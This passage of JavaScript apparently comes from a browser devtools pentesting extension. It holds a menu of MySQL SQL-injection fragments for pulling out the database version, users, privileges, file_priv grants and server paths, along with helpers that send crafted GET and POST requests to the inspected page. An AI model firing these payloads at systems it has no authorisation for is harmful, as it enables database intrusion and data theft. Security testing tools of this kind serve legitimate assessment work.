            payloadText = "VERSION()";
            this.setSelectedText(payloadText);
            break;
        case 'variable3':
            payloadText = "@@GLOBAL.VERSION";
            this.setSelectedText(payloadText);
            break;
        case 'variable4':
            payloadText = "USER()";
            this.setSelectedText(payloadText);
            break;
        case 'variable5':
            payloadText = "CURRENT_USER()";
            this.setSelectedText(payloadText);
            break;
        case 'variable6':
            payloadText = "SYSTEM_USER()";
            this.setSelectedText(payloadText);
            break;
        case 'variable7':
            payloadText = "SESSION_USER()";
            this.setSelectedText(payloadText);
            break;
        case 'variable8':
            payloadText = "SUBSTRING_INDEX(USER(),0x40,1)";
            this.setSelectedText(payloadText);
            break;
        case 'variable9':
            payloadText = "(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
            this.setSelectedText(payloadText);
            break;
        case 'variable10':
            payloadText = "DATABASE()";
            this.setSelectedText(payloadText);
            break;
        case 'variable11':
            payloadText = "SCHEMA()";
            this.setSelectedText(payloadText);
            break;
        case 'variable12':
            payloadText = "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
            this.setSelectedText(payloadText);
            break;
        case 'variable13':
            payloadText = "@@HOSTNAME";
            this.setSelectedText(payloadText);
            break;
        case 'variable14':
            payloadText = "@@VERSION_COMPILE_MACHINE";
            this.setSelectedText(payloadText);
            break;
        case 'variable15':
            payloadText = "@@VERSION_COMPILE_OS";
            this.setSelectedText(payloadText);
            break;
        case 'variable16':
            payloadText = "@@BASEDIR";
            this.setSelectedText(payloadText);
            break;
        case 'variable17':
            payloadText = "@@DATADIR";
            this.setSelectedText(payloadText);
            break;
        case 'variable18':
            payloadText = "@@HAVE_OPENSSL";
            this.setSelectedText(payloadText);
            break;
        case 'variable19':
            payloadText = "@@WAIT_TIMEOUT";
            this.setSelectedText(payloadText);
            break;
        case 'variable20':
            payloadText = "@@MYISAM_RECOVER_OPTIONS";
            this.setSelectedText(payloadText);
            break;
        case 'variable21':
            payloadText = "@@HAVE_INNODB";
            this.setSelectedText(payloadText);
            break;
        case 'variable22':
            payloadText = "@@HAVE_SYMLINK";
            this.setSelectedText(payloadText);
            break;
        case 'variable23':
            payloadText = "@@CHARACTER_SET_CONNECTION";
            this.setSelectedText(payloadText);
            break;
        case 'variable24':
            payloadText = "@@CHARACTER_SET_CLIENT";
            this.setSelectedText(payloadText);
            break;
        case 'variable25':
            payloadText = "@@CHARACTER_SET_FILESYSTEM";
            this.setSelectedText(payloadText);
            break;
        case 'variable26':
            payloadText = "@@FT_BOOLEAN_SYNTAX";
            this.setSelectedText(payloadText);
            break;
        case 'variable27':
            payloadText = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
            this.setSelectedText(payloadText);
            break;
        case 'variable28':
            payloadText = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
            this.setSelectedText(payloadText);
            break;
        case 'variable29':
            payloadText = "(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
            this.setSelectedText(payloadText);
            break;
        case 'variable30':
            payloadText = "@@CHARACTER_SET_SERVER";
            this.setSelectedText(payloadText);
            break;
        case 'variable31':
            payloadText = "@@CHARACTER_SET_DATABASE";
            this.setSelectedText(payloadText);
            break;
        case 'variable32':
            payloadText = "@@CHARACTER_SETS_DIR";
            this.setSelectedText(payloadText);
            break;
        case 'variable33':
            payloadText = "@@COLLATION_CONNECTION";
            this.setSelectedText(payloadText);
            break;
        case 'variable34':
            payloadText = "@@CONNECT_TIMEOUT";
            this.setSelectedText(payloadText);
            break;
        case 'variable35':
            payloadText = "@@PID_FILE";
            this.setSelectedText(payloadText);
            break;
        case 'variable36':
            payloadText = "@@SLAVE_LOAD_TMPDIR";
            this.setSelectedText(payloadText);
            break;
    }
    currentFocusField.focus();
}
/* ---------- Actions --------- */

function getSelectedText() {
    var field = currentFocusField;
    if (!field) {
        showPanelNotification('Please enter text first.');
        return false;
    }

    var selectionStart = field.selectionStart;
    var selectionEnd = field.selectionEnd;
    if (selectionEnd - selectionStart < 1) {
        showPanelNotification(field.value
            ? 'Select text before using this function.'
            : 'Please enter text first.');
        return false;
    }
    return field.value.substr(selectionStart, selectionEnd - selectionStart);
}

function setSelectedText(str) {
    var selectionStart = this.currentFocusField.selectionStart;
    var selectionEnd = this.currentFocusField.selectionEnd;
    var pre = this.currentFocusField.value.substr(0, selectionStart);
    var post = this.currentFocusField.value.substr(selectionEnd, this.currentFocusField.value.length);
    this.currentFocusField.value = pre + str + post;
    this.currentFocusField.selectionStart = selectionStart;
    this.currentFocusField.selectionEnd = selectionStart + str.length;
}


function urlencode(inputString) {
    var encodedValue = encodeURI(inputString);
    encodedValue = encodedValue.replace(/\*/g, '%2a');
    encodedValue = encodedValue.replace(/\//g, '%2f');
    encodedValue = encodedValue.replace(/\+/g, '%2b');
    encodedValue = encodedValue.replace(/\'/g, '%27');
    return encodedValue;
}

//=========== ui buttons

function loadUrl() {
    browser.devtools.inspectedWindow.eval("window.location.href")
        .then(function (evaluationResult) {
            if (evaluationResult[1]) {
                urlfield.value = "";
            } else {
                urlfield.value = evaluationResult[0];
            }
        }, function () {
            urlfield.value = "";
        }
        );
}

function splitUrl() {
    var uri = currentFocusField.value;
    uri = uri.replace(new RegExp(/&/g), "\n&");
    uri = uri.replace(new RegExp(/\?/g), "\n?");
    currentFocusField.value = uri;
    return true;
}

var typePostdata = "";

function getPostData() {
    var dataString = postdatafield.value;
    if (dataString || '') {
        if (dataString.indexOf("Content-Disposition: form-data; name=") > -1) {
            typePostdata = "multipart";
            return dataString;
        }
        if (dataString.indexOf("&") > -1) {
            typePostdata = "formdata";
            dataString = dataString.replace(new RegExp(/\n|\r/g), '');
            dataString = dataString.replace(new RegExp(/\+/g), "%2B");
            return dataString.split('&');
        }
        if (dataString.indexOf("=") > -1) {
            typePostdata = "formdata";
            dataString = dataString.replace(new RegExp(/\n|\r/g), '');
            dataString = dataString.replace(new RegExp(/\+/g), "%2B");
            return [dataString];
        }
    }
    typePostdata = "raw";
    return dataString;
}

/*
 * Firefox's inspectedWindow.eval API accepts source text rather than a
 * callable function. Keep each inspected-page operation as a readable,
 * fixed wrapper and pass panel data only through JSON.stringify.
 */
function buildFormSubmissionScript(formData) {
    return `(function (submission) {
        var form = document.createElement('form');
        form.method = 'post';
        form.action = submission.action;
        submission.fields.forEach(function (field) {
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = field.name;
            input.value = field.value;
            form.appendChild(input);
        });
        document.body.appendChild(form);
        HTMLFormElement.prototype.submit.call(form);
        return true;
    })(${JSON.stringify(formData)});`;
}

function displayPostResponse(responseText) {
    postResponseOutput.textContent = responseText;
    postResponseContainer.hidden = false;
}

function execute() {
    var url = urlfield.value.replace(/[\n\r]/g, '');
    var requestUrl;
    var targetUrl;

    try {
        requestUrl = new URL(url);
        if (requestUrl.protocol !== "http:" && requestUrl.protocol !== "https:") {
            throw new Error("Only HTTP and HTTPS URLs can be requested.");
        }
    } catch (error) {
        showPanelNotification("Enter a valid HTTP or HTTPS URL.");
        return;
    }

    targetUrl = requestUrl.origin + requestUrl.pathname;
    if (requestUrl.search) {
        targetUrl += "?" + urlencode(requestUrl.search.slice(1));
    }

    if (refererCbx.checked) {
        browser.runtime.sendMessage({
            urlfield: targetUrl,
            refererfield: refererfield.value
        });
    }

    if (!postdataCbx.checked) { // just get method
        browser.devtools.inspectedWindow.eval("window.location.href = " + JSON.stringify(targetUrl) + ";")
            .then(function (result, isException) {
                //no action
            });
        return;
    }
    var postData = getPostData();
    if (typePostdata === "formdata") {
        var fields = [];
        for (var i = 0; i < postData.length; i++) {
            var separator = postData[i].indexOf('=');
            fields.push({
                name: separator < 0 ? postData[i] : postData[i].slice(0, separator),
                value: separator < 0 ? "" : postData[i].slice(separator + 1)
            });
        }
        var formData = { action: targetUrl, fields: fields };
        browser.devtools.inspectedWindow.eval(buildFormSubmissionScript(formData))
            .then(function (result, isException) {
                //no action
            });
    }
    else // for raw data and mutilpart formdata
    {
        fetch(targetUrl, {
            method: "POST",
            redirect: 'follow',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cache': 'no-cache'
            },
            credentials: 'include',
            body: postdatafield.value
        }).then(function (response) {
            response.text().then(function (text) {
                displayPostResponse(text);
            });
        });
    }
}


